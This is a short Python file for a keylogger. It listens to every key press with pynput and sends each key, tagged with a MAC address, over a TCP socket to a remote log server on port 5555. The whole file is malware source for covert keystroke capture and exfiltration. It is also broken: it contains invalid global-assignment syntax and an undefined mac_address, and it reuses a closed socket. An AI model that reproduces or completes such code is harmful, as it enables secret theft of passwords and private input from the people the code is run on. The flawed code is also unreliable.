from pynput.keyboard import Key, Listener
import logging
import json
import socket

log_server_ip = ""
log_server_port = 5555

def on_press(key):
    data = { 'mac': str(mac_address), 'key': str(key) }
    json_data = json.dumps(data)
    
    sock.connect((log_server_ip, log_server_port))

    try:
        sock.sendall(str(json_data))
    finally:
        sock.close()

def main():
    global mac_address
    global sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()